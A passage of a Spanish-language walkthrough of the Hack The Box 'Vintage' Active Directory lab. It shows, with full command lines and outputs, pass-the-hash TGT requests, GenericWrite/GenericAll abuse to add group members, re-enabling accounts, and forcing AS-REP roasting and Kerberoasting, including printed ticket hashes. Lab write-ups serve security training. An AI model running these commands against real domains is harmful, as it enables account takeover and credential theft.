❯ impacket-getTGT vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178 -dc-ip "$IP"
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in GMSA01$.ccache

❯ export KRB5CCNAME=$(pwd)/'GMSA01$.ccache'

❯ klist
Ticket cache: FILE:/home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/Vintage/content/GMSA01$.ccache
Default principal: GMSA01$@VINTAGE.HTB

Valid starting       Expires              Service principal
04/24/2025 23:55:45  04/25/2025 09:55:45  krbtgt/VINTAGE.HTB@VINTAGE.HTB
	renew until 04/25/2025 23:53:09
```

***
## Shell as C.Neri

### Abusing GenericWrite Privilege on a Group to Add Members

Siguiendo el path inicial identificado, ahora que tenemos acceso como `GMSA01$`, podemos abusar de los permisos **GenericWrite** y **AddSelf** que tiene sobre el grupo `SERVICEMANAGERS`.

Esto nos permite añadir la cuenta `GMSA01$` (o cualquier otra) como miembro del grupo. En este caso, optamos por añadir al usuario `P.Rosa`, que fue el que se nos proporcionó al inicio del pentest. Sin embargo, también podríamos haber añadido a `FS01$` o incluso a la propia `GMSA01$`, ya que disponemos de sus credenciales.

Este paso es clave, ya que formar parte de `SERVICEMANAGERS` nos otorga privilegios **GenericAll** sobre varias cuentas del dominio, lo que amplía aún más la superficie de ataque.

![image](/assets/img/writeups/htb-vintage/Vintage_12.png)

Para añadir al usuario `P.Rosa` al grupo `SERVICEMANAGERS`, tenemos varias formas de hacerlo mediante autenticación Kerberos.

En nuestro caso, usamos tanto **bloodyAD** como **PowerView.py**, ya que ambas permiten realizar esta acción utilizando un TGT en caché.

En ambas herramientas nos conectamos a través de Kerberos mediante el TGT (`.ccache`) cargado en la variable `KRB5CCNAME` y añadimos al usuario `P.Rosa` al grupo mencionado.

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb** y la variable de entorno `IP` que tiene como valor la dirección IP de **Vintage** - **10.10.11.45**.
{: .prompt-danger }


```bash
❯ bloodyAD -d vintage.htb --host "$FQDN" -k add groupMember 'SERVICEMANAGERS' 'P.Rosa'
[+] P.Rosa added to SERVICEMANAGERS
```

```bash
❯ powerview vintage.htb/'GMSA01$'@"$FQDN" -k --no-pass --dc-ip "$IP"
Logging directory is set to /home/gzzcoo/.powerview/logs/vintage-gmsa01$-dc01.vintage.htb
[2025-04-24 23:58:37] [Storage] Using cache directory: /home/gzzcoo/.powerview/storage/ldap_cache

(LDAP)-[dc01.vintage.htb]-[VINTAGE\gMSA01$]
PV > Add-DomainGroupMember -Identity 'SERVICEMANAGERS' -Members 'P.Rosa'
[2025-04-24 23:59:18] User P.Rosa successfully added to SERVICEMANAGERS
```

---
### Abusing GenericAll privileges to Enable User Accounts, DONT_REQ_PREAUTH & SPNs for AS-REP Roasting & Kerberoasting

En este punto, la usuaria `P.Rosa` ya forma parte del grupo `SERVICEMANAGERS`, el cual tiene permisos de **GenericAll** sobre las siguientes cuentas del dominio:

* `SVC_SQL@vintage.htb`
* `SVC_LDAP@vintage.htb`
* `SVC_ARK@vintage.htb`

Tener GenericAll implica **control total** sobre esos objetos. Podemos, entre otras cosas:

* Cambiar sus contraseñas
* Modificar atributos sensibles (como `userAccountControl`)
* Habilitar la opción `DONT_REQ_PREAUTH` para ataques de **AS-REP Roasting**
* Configurar o forzar **SPNs** para realizar **Kerberoasting**
* Habilitar cuentas deshabilitadas

Esto nos da un abanico de opciones para seguir explotando el entorno dependiendo de lo que necesitemos en cada momento.

![image](/assets/img/writeups/htb-vintage/Vintage_13.png)

Revisando las cuentas sobre las que tenemos permisos de **GenericAll**, notamos que una de ellas —`SVC_SQL@vintage.htb`— se encuentra deshabilitada.

Como contamos con control total sobre este objeto, podemos **habilitar la cuenta fácilmente modificando el atributo `userAccountControl`**, lo cual nos devuelve el acceso total a esa identidad para futuros usos (como login, SPN abuse o AS-REP Roasting si lo activamos).

![image](/assets/img/writeups/htb-vintage/Vintage_14.png)

#### Enabling users to be susceptible to AS-REP Roast

En este primer caso, explicaremos una manera de realizar esta parte de la máquina **`Vintage`** que será habilitando a los usuarios a que dispongan de la flag `DONT_REQ_PREAUTH` de Kerberos y así sean susceptibles a un **AS-REP Roast Attack**.&#x20;

Como hemos comentado anteriormente, disponemos de las herramientas de **bloodyAD** y **PowerView.py** en las cuales verificaremos ambas maneras de cómo se utilizan estas herramientas para habilitar el `DONT_REQ_PREAUTH` y por otro lado, habilitar a un usuario deshabilitado modificando su **UAC** (**userAccountControl**).

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb** y la variabl**e** `IP` que corresponde a la dirección IP de **Vintage** 10.10.11.45.
{: .prompt-danger }

**bloodyAD**

Para el caso de la herramienta de **bloodyAD**, la sintaxis para habilitar una cuenta deshabilitada es bastante sencilla. Ya que solamente deberemos remover la flag `ACCOUNTDISABLE` de la UAC del usuario en cuestión.

Por otro lado, para habilitar que un usuario disponga de la flag `DONT_REQ_PREAUTH` de Kerberos y volverlo susceptible a **AS-REP Roasting**, deberemos de añadir una nueva flag `DONT_REQ_PREAUTH` a la UAC del usuario.

```bash
❯ bloodyAD --host "$FQDN" -d vintage.htb -k remove uac 'SVC_SQL' -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQLs userAccountControl

❯ bloodyAD --host "$FQDN" -d vintage.htb -k add uac 'SVC_SQL' -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_SQLs userAccountControl

❯ bloodyAD --host "$FQDN" -d vintage.htb -k add uac 'SVC_LDAP' -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_LDAPs userAccountControl

❯ bloodyAD --host "$FQDN" -d vintage.htb -k add uac 'SVC_ARK' -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to SVC_ARKs userAccountControl
```

**PowerView.py**

Para la herramienta de **PowerView.py** (versión de **PowerView.ps1** pero en Python y para Linux) la sintaxis para habilitar a un usuario que se encontraba deshabilitado o de modificar su flag de `DONT_REQ_PREAUTH` para que sea susceptible a **AS-REP Roasting** es un poco más compleja. Esto debido que deberemos de modificar el **UAC** (**userAccountControl**) del usuario e indicarle el valor que queramos asignarle dependiendo de las flags.

Para ello, disponemos de la siguiente página web **UAC Decoder** que nos servirá para verificar el valor exacto del **UAC** dependiendo de las flags que le indiquemos.

[https://uacdecoder.com/](https://uacdecoder.com/)

En este primer ejemplo, lo que buscamos es habilitar a una cuenta deshabilitada, es decir dejarla en estado normal. Para ello, en la página de **UAC Decoder** asignaremos las siguientes flags y nos devuelve que el valor del **userAccountControl** es **66048** que es el que deberemos asignar al usuario deshabilitado para volver a habilitarlo.

![image](/assets/img/writeups/htb-vintage/Vintage_15.png)

Por otra parte, para activar la flag de `DONT_REQ_PREAUTH` de Kerberos, en la página de **UAC Decoder** le asignaremos esa casilla y nos devolverá que el valor del **UAC** es **4260352**.

![image](/assets/img/writeups/htb-vintage/Vintage_16.png)

Accederemos a **PowerView.py** a través del usuario `P.Rosa` mediante su TGT (`.ccache`) y a través de los siguientes comandos, habilitaremos al usuario `SVC_SQL` que se encontraba deshabilitado y le indicaremos a los usuarios `SVC_SQL`, `SVC_LDAP` y `SVC_ARK` la flag de `DONT_REQ_PREAUTH` de Kerberos mediante el valor del **UAC** que se nos mostró anteriormente.

```bash
❯ powerview vintage.htb/'P.Rosa'@"$FQDN" -k --no-pass --dc-ip "$IP"
Logging directory is set to /home/gzzcoo/.powerview/logs/vintage-p.rosa-dc01.vintage.htb
[2025-04-25 00:43:13] [Storage] Using cache directory: /home/gzzcoo/.powerview/storage/ldap_cache

(LDAP)-[dc01.vintage.htb]-[VINTAGE\P.Rosa]
PV > Set-DomainObject -Identity "SVC_SQL" -Set 'userAccountControl=66048'
[2025-04-25 00:54:54] [Set-DomainObject] Success! modified attribute useraccountcontrol for CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb

(LDAP)-[dc01.vintage.htb]-[VINTAGE\P.Rosa]
PV > Set-DomainObject -Identity 'SVC_SQL' -Set 'userAccountControl=4260352'
[2025-04-25 00:57:08] [Set-DomainObject] Success! modified attribute useraccountcontrol for CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb

(LDAP)-[dc01.vintage.htb]-[VINTAGE\P.Rosa]
PV > Set-DomainObject -Identity 'SVC_LDAP' -Set 'userAccountControl=4260352'
[2025-04-25 00:57:12] [Set-DomainObject] Success! modified attribute useraccountcontrol for CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb

(LDAP)-[dc01.vintage.htb]-[VINTAGE\P.Rosa]
PV > Set-DomainObject -Identity 'SVC_ARK' -Set 'userAccountControl=4260352'
[2025-04-25 00:57:18] [Set-DomainObject] Success! modified attribute useraccountcontrol for CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
```

En este punto, ya modificamos correctamente el atributo `userAccountControl` de los usuarios seleccionados, activando la flag **`DONT_REQ_PREAUTH`** de Kerberos. Esto los vuelve vulnerables a un **AS-REP Roasting Attack**.

En la enumeración inicial, ningún usuario era susceptible, pero ahora al volver a lanzar el ataque con la herramienta `GetNPUsers.py` de **Impacket**, obtenemos con éxito los hashes **TGT (Ticket Granting Ticket)** de los tres usuarios a los que les activamos la flag.

Estos hashes los podemos almacenar en un archivo llamado `hashes` y posteriormente crackearlos de manera offline con **John** o **Hashcat**.

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ impacket-GetNPUsers -no-pass -usersfile users.txt -dc-ip "$IP" vintage.htb/
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_sql@VINTAGE.HTB:aa0537c45edb50f74faf1919c198243b$63d014b7932f1c88c9a093af1582c817d6c9bfac7817038669f375e531cea2e6b04a9343dca06af22c742d4529cdacf741d1f3a60901a6fddcdb7bd4329d3151d577303e09f67225475641225730dd879d66c01e51d209d7cfd370c3817d3d09dde5823b5e9ca61ca6eba479cc3b3ddca52171ed99001c50a2911ef83355bee208b5e0bf5223ad0c7844c5c90be7bb7d52af8fb445dfb68fd412028db5d1b150f963203f11518f6d7ceb93db8c9a49c6348f6eadd51b3d8f91747f03ec5b442c3937db89ff935fcd03fa5db3c3dc5537a4ee291071ae3896bbe163ab38b6adecd41a747782fa3d898d2b
$krb5asrep$23$svc_ldap@VINTAGE.HTB:4d302fdb0fb55c102fe13efb512e12c9$bbe6165b3e00a4018f2790967ace07d32d519b85bdc991202cbb30dd58c7647efab003e66f6ad925a617cf092bdbec0b718695a35004631ef2fdba9df3cb243b0faac184e1c6aef3cad21afc3cbd95352d2dfbcb6e78f28da325fb87e8f331a8a24c1001d848b533eca072ba0b9412155476ebf3984242f094c23ff6cf560ccfe1e84eb8455e468de788a24389a8ea58f187ac9db776d7736bf0cd735afe330928a3364b3ec622002db6a4a1874c27b8649f1e556c6ba002ae316edf96901dcfa2e64500a23d8aecef799c9282f951e9a5a587682865143880c9b20e3c4912caefcab634fc32e2c8e522
$krb5asrep$23$svc_ark@VINTAGE.HTB:14d84ca2dcd8a5290cfe40abc684917e$aa09fe27d090f35ffdc6690cfe625af18d2bd449787f44eb5eb340152fe881fe0f5cf2be89f889bbd40bb2940a29864b29509fa748897575ef1db7f455edfccdb1822391bb13693a30ca7adbf78b06a00d7fafddbad6aeedbd9dd92101f58f069adf365635e58cd4c3422a4685298991f8aca1105d1a320d6bb5a1930214ec33da08e5e2f0871127cb1d9844f56908bc2017e9ecbeebb63afb2540b33dd0075ce924781933ae047f94d1e7d0d109e9bb8e4afbeb5dfc59424f7d509876e6d1fb3ee06bfadb4364400177ef7848e4a6832a1ebf863a864fd4ea3d57d8ca9d8d838b2aeb7e583b3cec5951
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
```

#### Enabling users to be susceptible to Kerberoasting Attack**

En lugar de aplicar la flag `DONT_REQ_PREAUTH` para realizar un AS-REP Roasting, también podemos hacer que los usuarios sean vulnerables a **Kerberoasting** asignándoles un **SPN (Service Principal Name)**.

Esto lo haremos usando `bloodyAD`, `PowerView.py` y `targetedKerberoast.py`, siempre autenticándonos vía **Kerberos** con el TGT cargado en la variable `KRB5CCNAME`.

> Tenemos la variable de entorno `FQDN` creada anteriormente que tiene como valor: **dc01.vintage.htb** y la variable de entorno `IP` que tiene como valor la dirección IP de **Vintage** - **10.10.11.45**.
{: .prompt-danger }

**bloodyAD**

Para **bloodyAD**, la sintaxis es bastante sencilla. En este caso, nos autenticamos mediante Kerberos (`-k`) y eliminamos la flag `ACCOUNTDISABLE` del usuario `SVC_SQL` para asegurarnos de que no esté deshabilitado.

Luego, añadimos un atributo **SPN (Service Principal Name)** a cada uno de los usuarios. Esto los hace vulnerables a **Kerberoasting**, ya que al tener un SPN asociado, es posible solicitar su TGS.

Es importante que cada SPN sea distinto, ya que **no se puede asignar el mismo SPN a múltiples cuentas** dentro del dominio.

```bash
❯ bloodyAD --host "$FQDN" -d vintage.htb -k remove uac 'SVC_SQL' -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQLs userAccountControl

❯ bloodyAD --host "$FQDN" -d vintage.htb -k set object 'SVC_SQL' servicePrincipalName -v 'cifs/gzzcoo'
[+] SVC_SQL's servicePrincipalName has been updated

❯ bloodyAD --host "$FQDN" -d vintage.htb -k set object 'SVC_LDAP' servicePrincipalName -v 'cifs/gzzcoo1'
[+] SVC_LDAP's servicePrincipalName has been updated

❯ bloodyAD --host "$FQDN" -d vintage.htb -k set object 'SVC_ARK' servicePrincipalName -v 'cifs/gzzcoo2'
[+] SVC_ARK's servicePrincipalName has been updated
```

**PowerView.py**

En el caso de **PowerView.py**, lo primero que hacemos es habilitar nuevamente al usuario `SVC_SQL`, modificando su atributo `userAccountControl` a **66048**, como vimos anteriormente con [**UAC Decoder**](https://www.techjutsu.com/uac-decoder).

![image](/assets/img/writeups/htb-vintage/Vintage_17.png)

Una vez habilitada la cuenta, utilizamos PowerView.py para asignar un **SPN (Service Principal Name)** distinto a cada una de las tres cuentas, lo que las hace susceptibles a un **ataque de Kerberoasting**.

```bash
❯ powerview vintage.htb/'P.Rosa'@"$FQDN" -k --no-pass --dc-ip "$IP"
Logging directory is set to /home/gzzcoo/.powerview/logs/vintage-p.rosa-dc01.vintage.htb
[2025-04-25 00:43:13] [Storage] Using cache directory: /home/gzzcoo/.powerview/storage/ldap_cache

(LDAP)-[dc01.vintage.htb]-[VINTAGE\P.Rosa]
PV > Set-DomainObject -Identity "SVC_SQL" -Set 'userAccountControl=66048'
[2025-04-25 00:54:54] [Set-DomainObject] Success! modified attribute useraccountcontrol for CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb

(LDAP)-[dc01.vintage.htb]-[VINTAGE\P.Rosa]
PV > Set-DomainObject -Identity 'SVC_SQL' -Set 'servicePrincipalname=cifs/gzzcoo'
[2025-04-25 00:57:42] [Set-DomainObject] Success! modified attribute serviceprincipalname for CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb

(LDAP)-[dc01.vintage.htb]-[VINTAGE\P.Rosa]
PV > Set-DomainObject -Identity 'SVC_LDAP' -Set 'servicePrincipalname=cifs/gzzcoo1'
[2025-04-25 00:57:48] [Set-DomainObject] Success! modified attribute serviceprincipalname for CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb

(LDAP)-[dc01.vintage.htb]-[VINTAGE\P.Rosa]
PV > Set-DomainObject -Identity 'SVC_ARK' -Set 'servicePrincipalname=cifs/gzzcoo2'
[2025-04-25 00:57:55] [Set-DomainObject] Success! modified attribute serviceprincipalname for CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
```

**targetedKerberoast.py** 

Por otro lado, disponemos de la herramienta `targetedKerberoast.py`, que nos permite añadir un SPN (Service Principal Name) a los usuarios sobre los cuales tengamos permisos de escritura en ese atributo.\
Una vez asignado el SPN, la herramienta extrae el hash TGS (Ticket Granting Service) de esa cuenta para posteriormente poder crackearlo. Al terminar, elimina el SPN que hemos añadido para "evitar" dejar más rastro del necesario.

>Previamente deberemos asegurarnos de que el usuario `SVC_SQL@vintage.htb` esté habilitado. Para ello podemos utilizar herramientas como `PowerView.py`, `bloodyAD` o cualquier otra que nos permita modificar el atributo `userAccountControl`.
{: .prompt-info }

```bash
❯ python3 /opt/targetedKerberoast/targetedKerberoast.py -d vintage.htb --dc-ip "$IP" -u 'P.Rosa' --dc-host "$FQDN" -k --no-pass
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (svc_sql)
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$6b1e3ea60b0897a1f6ee3b01a79520a5$a50c9db1908082e246e551d202aebd8c0e2b8882b21020054971a6bc6138b7998eb537865edbc49afeb37d87389b16734972d0f37d4d86fb84b56e2c228f09575ac49afe4aa903889a0409b7811d4aca11e1640c4dfa593956d70ab3ec1eac1ab9a7a4edb3ceb2766110bf00c9ae87bb96f6d3d874aefc50a90133c9898d675062614d69f517d1d0e6481f6caa2ebcf49e60bae92e0da717a411106526ecd9dabe62dd95135fb06c0977f5e96f23b6cd14549cb5d02b8254d10a3ed6a0f74b230788b6f9b2a8d714c63bb08a1f9cd67d4c3f129fa8a5e5e0d00fbe4f1305c1f29d51f960cf7e1696b28f54298d8b15b5e30796598994851c66d6553905e981b46d4cf07c973864c59f0ffd0b5e29435e91ef0a2923f6999044fb2fa31a0004b9e4c09f8df78df86cf3cd1f10af23ca1cf5c082a7d3ad36b39ef8fe8fc6e495c546b95c449c11de4377c32efb8e1f661b45502831daed85fe38bb6e58b323043ecbb3d55dd87938720b23179fe037c992d80131f482d5a7123b0d136bf1baca38e2fe71c677abf2af23f07212b80afaa296e1731b46ec2396883a947c7bce71fc076d3222c5d77944bd2443d4bae42429b1d0f45562870f121aa2399d1cce4c4b9c6d7dd2e4982204987a0d28e038314ef16fd2efe1ae53750979ad3f3688a88ad17b46d3ce12c11be9d63b908a96fa320bbc805f9aac15f57ea60f46b72b32a807cc8be94aeb75b5a9dc85123e6f191a05ca41551451261904519d167b8897f2bcee48cfb0a81c563ff0eb8f95e8c9e0e747abdadd3a492d688e964f1c8f27c3e82626d2b2cff85470dc57d6b6a494d20ce416c5c7eb0f8e1d19d3525e34ad4fe0b5d08b8cbeacb7f1a85bee3dc14cd0d7042c32c6b336d0e7099b804789836c4025860a34a70e7e58627772fd7dbb92a07aa9567955476d59c840fbfc3337c4532a5eebd6886f4a0b9c818c6961eebc315ca75933cca93138c671430abb8e5e3ede77fa9f5bc1dbcc96d6d799d3d34af0aab3f4a6e4bef6ecd931189f8756f966e49b37bd6ec9df571b826df70eb9b72f0f295a92ea3243b7f347cf1bf793695c9d4a598854fef993adaf1f31af69e313bcede3dba442f9836488a5e11f326b9c52a1d44ea232da9fb7c480c215c3b20df21405fc747fb32fda8309feb3eb2356cd1eb61c28b01c6a92142299f394497ccfdd644c6a5920bfed07db4cab3c02523551dedc5e2f49b707e48a2379f02fb3e9b538e56a1a1248b7ed8cb04069dada9872ca6995c883ce00f59c3016b7080707d0ef90daf8686293f40d5bcd24e77b2ea2b99db7988dec2e69a67eba695c7778dba563458dc1dbba3bf9a85b9f3230a2b03f0ddaaa7f58498e0845067ae604595897e1454398663ccbdeca1364ebf9256277ca0b4151c481811023cfa02ea536e7811269cdf48eab7c8de143615a92ce
[+] Printing hash for (svc_ldap)
$krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb/svc_ldap*$5d068faac3ee4613c19f7572514204c1$f005f9e724ffc7d4401d6c8522a39ec3953b10aa9e0288548ac66b33215f248b68f0c69232fa83e2e9228486b44d5b8744dd65376e4ad4a47f89a486db49a27753b7a3c43cae228b5aa73e51b60e75e1ade4e592a88656dc73316d18b2895f930fb596f500e3badbba156d710cd4c418d1795d140c5396e3f14ffb43d6360316e0a41a667d502f00c71c0b8de52edba6f9c6b68cb8482f2220d31ab8daf2a90855c2f1cbf2d2e90841bdd621b03d71eba55fe06477cc66d0dd6dba1b16d62e40a8c267dfdc315ca3d696c69c8c39871f39e22524e1308a2b6b4b560160f7def27838be9c43d6c9f307bd7cafe1a207b275316918efc88d0c3a68b86340146a8c46848d6699885b6d522267e0e1a5b3fe555e0faea0f7d1ad3b691cd9a1c028ec11620d0682bc44a239317522fbfaf0dac2f71072df7b771e0a881afacd94a9752c3ef62edf18763f1ca372872dc868c59f9aafd1ba9f3832765ae9aa52c321731e89cff6b4287ce9c7ec8da0b7deb18707475007a2e3f72db410c188eb7d4e4d7021e4d26b980caca97ac811f2a0785897d3cb82d4246f3f95998115c5bf38dcd824c5652a316afa780019a2e956acf14dd3808a8c25b6abb70a2c14f9e21cfa100c593603506795f79866e81ba9363d60dba0686a8cf5a2cfb5a38b96732d00bb50bc38eb1e5b6085bfc0c90e4fc4a485efa57d71b356b6820757419691efdfb9c17f37ae3653b97e8422d9011000251bbe08eafab012584826ad9bf6b858c4626db6c1510ed00d5d9f61d1ab25627cac7f470254049d0723fa5f7f5f1362f8f3f2266be8ea45a223abfc26b414a4390cc74a08b9f2ad82c05e3a5767249326c5a5c57e48e76e5d4caebdd44e7b6046175c32b8f73928ae261f76decab70b1d0cc7436d973e415d9eb6ddec3b4b654164c782b954488b48dfb19f603a590e200c9b0e44ea4b3d361d735b8d3195e208b023442f302fb08a4806be2a5ae33da52e98d227cd903d3602a8dc2b0eaef245a6b7209a5b1adf74f1a57122161b1888dd247b0651bc425f4164d39edaa4f76af70019c4cf4cfcbb782385296cebd2cb7f8f3b719238fe2fdeecee32a00ea72fb154ad789d122376d52dff0545f7b2a3681d6c6e567bda28b8c265a47cd5829b8e51aee4ebccd9f051742b09e9346e1933a6120e90ed8a40677e83b061d54cc4ea339e4262dc2d2c3d12aa64c8144f259e0ec1c9caef25c6c40dac4cde26947ba4a4567461c6fa673cb636ad10979816c96741adf8f02eb6c7ed09d72a86ba9e354644759c95ed4f5a2a8c7b0c7917a02da25f1c3c6cac7db30ffbeacadbde61e484ae527b4a0ecaf9cce0431c7ed0a5b4e82814f468cd46b3778f1ffffc79fbffcc080d7348b4ec2d523a2f8c1ba132e7a06f00c6239094df86146c1c5564b591f935af5e5ce6bfd4a7d6c1173e3bd9601e
[+] Printing hash for (svc_ark)
$krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb/svc_ark*$62506c35878bcde0afe02fdf81038c7d$5c128ae7b35073f063fe7f84f736727b6698344b42dd54726c8af454501758e7a9a40ccdc816a43be31ce1cf834dad7c3abe0192170b15649972a21ae454c5bd3ee257516e1bd68e94ea4d382d5a6e75c51596cfdfb2012d5250d8440ecf857ec62c1eb045b9a607891ab14739d68863aa3095441efe3fc9f3a0c9875983dc9328b03f371deebb4f57a4385276f01057bf4717dc09b869c5d05815999c6e3a6cbf3ee8ca7e2f586cb4c1917ab727be7448f60a7d2384f4a7aef31c35aa2fe30c552e8f6f82804957eeb54aa9521140af7bc2acfc2b888d92ee9c8489437daeb19f7ca9689062988264987c467f074a53114b712031de7586961d57bd3a4abc4940e54eae1c4b8f8126155e7315ab8184e615017c09afee1354abcfe563010befa3689e37afc40953a4f38145bc0d73934522bd787b7d4c7a6b7b08cec45788d3a4fa67920a8155fc92f461f7ebf73f4672e06700e238d2ea9d90c59968eda9cf15fb7546f4a4c14bc8286a7af0159888f62c9ed3d37560623555bada2ec009df2bfb2be63d374517e359dd5a17fe6956801b8e6df75743ce79504c89b67e1a82d945f3fcb8f618f262fc58dcc70afde15f87d4652e57f635b3a77f04ea41412cb207e255188a88f9e372597570c121c6e38449f405f67285d19d3d99b0baea6682a769a9da436fae1aefe73a2c88cdc6263218a69b97836d18e7d4965b0e92c1f08fe28201e97037e632bbe6662f8487a3aa34faa2ad97e46245a8e2d88d09b68996d45fb75ead1d1e51addacf0db4f4eb8a6255727d65258af5cd5ef7a8f789f601e3cabf06d0a46deac739e32f775ac62fcd900d4a369314dcbc0cac6873aae907806d9303b52e9424c04205a5d5166dad0975c4d9ff13fde8ec0a325bed98f34ba406625be1694282208f6891d195ac7feb86844d80a94cb07ffc9e91b5753935d8c492e2291471703b7663774006fbf3a34b1b6ecb02e35d91e0259141a384f92b219a063bffb2c051de3177249236890883311749ad74c659067419677347745be09bcf55e9ef9e920a9bec155343561880905524d953f644e7c6bcb833d418e094ae13e0f563aec20061b2586a17ebdb4cbd43cdc767499dc611a5482c9d21bbfb78921ce22f0fbb6f52d13ed2417077f28ada750c49c17ce51edf2e47b1e2a0b065670b7d5802477b338bb2f6acc53fd793824ae316a5a4d64bc4e12523ac7e132e4b8b9dfb60bdf2fd9aed9ec7ef31679ce637d88a8269a6104d45d3117a598932f35db1b8cd52971f65d41dff871cf5844af269ebfd8ec321ec8bcfa8e07c8a07b688c3d27e511c21c4dc017ed89bcf493e46d711d8439459535c135644dd31600e1c404d98318f6f4f6ca3f0601e80a7af3b3f3314098dc8c7bae3fe159fd9a63bb1116158b970da647379b583ad697a1a442308f69d50600e69ff360f
```

En la enumeración inicial de la máquina **Vintage**, al usar `GetUserSPNs.py` de Impacket, no obtuvimos resultados porque **ningún usuario tenía un SPN (servicePrincipalName) asociado**.

Después de asignar un SPN personalizado a cada cuenta, volvimos a ejecutar la herramienta de Impacket y esta vez obtuvimos correctamente los **hashes TGS (Ticket Granting Service)** de los tres usuarios que hicimos vulnerables a **Kerberoasting.**

> Tenemos la variable de entorno `IP` creada anteriormente que tiene como valor: **10.10.11.45**
{: .prompt-danger }

```bash
❯ impacket-GetUserSPNs vintage.htb/P.Rosa -k -no-pass -dc-ip "$IP" -dc-host dc01 -request
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name      MemberOf                                               PasswordLastSet             LastLogon                   Delegation 
--------------------  --------  -----------------------------------------------------  --------------------------  --------------------------  ----------
cifs/gzzcoo           svc_sql   CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb  2025-04-24 23:52:04.892067  2025-04-25 00:06:27.407691             
cifs/gzzcoo1          svc_ldap  CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb  2024-06-06 15:45:27.881830  2025-04-25 00:06:27.673399             
cifs/gzzcoo2          svc_ark   CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb  2024-06-06 15:45:27.913095  2025-04-25 00:06:27.860879             



$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$0dd64e857aa78a46e5fd1daf5be6137b$8c78610214237b0ee0c85d6f5526a664b8c58db9099ab8c1bbe879d5b5dde41c7d2a88f837db436f62375cdd9154aecac93ae2d6c4d00b68ac322d8e346dc910ee09c7b0ccb16bc8113a43cfa17f33d6ec5e00bf9b6b68eb7a80a4236c226ec91f8919c4825c499ee9656662620b6e3e94a8b357ed9e1f990078917c68a80b844f7367d27b903c5801758d6aa1c9d663d709d3ca6b5c0a5ea922e958bde48aebbd337efab70e486cdcdb54d3d2f1892cd9eed593d4ba4d1a614c64c1f06ad1f8489ee66d0951e5f9a40a9295d710ce44d00933a0f12ab488b622dce5edcb510eabae4258cec3c872386d862bd24230d6db8ff908a11995880945026115e6f78b6746247f8c24bad3e61b5bd357cb646aead21d86ccacbcbc3fef4246e892df95978f94e4b929b4d2d70913932f589124c80a5e5e2e3087583c6f89886df4e4cde73b862576f21dae01be641efe9a93911dbbbf97b044fa0871e96d2b6d81fa5adbdc29aca1f0d744ee4f582ad16793fb799bf6feac8dd2d92207bfa1d6d1e7d8e8049afae4e24436108640b60740a2ba74604e4390cd28bd78b67e792e5c08565c4af4bb40879e0c8a96ce8fdfa1e7595ecc50f679ae3705a903267f57eb5178bf6dc909496c7905f36734f1ea960ac319840836d118c0eeddbb39ed78392b42a9d50b50068d90574e8504a538d4b3c238543c1ca0b28e327f55086fe011f20afc838c88a5a77cb01fa3f8b8fbabad170a0374b69f555621e7f4be5dec4a9676acbf8fe3e8e6f63f507eb1589b3bc11c0be58f1243a657fe69d2968c17cda809a073cece9d8bc6b4bc4433af17b6947912c4a5e2ae577cd681d052d1e133f29358ec4b566d3a2bb19d5c84dc12c3045cd58d6370ab24ddc76021d49cbb23bdfd0e0235058b4a747e5bbef727b4a2f1ad92a94c803258013e817e1ac7000c559ceedd7bc6acc8f46a880ec15766cb87e592112a043d5628be4d0f0b86bc557998ef76a324d5c40ad262a441b6ad1d09d3cc4d8bcd938b62b33562d341c5da3c8da30b1b51df028597f96f29a48fd4eb3bf659f671d97ef18be4432fc1757f00c763367459c7a40e9be902e7a3f555a5b785df37d9ad33ad3f012c64063ae00827533cbccede7e344d196e778db64e732a565871ed4820bec1e05d9bc64296ad699490c0d6b6fe7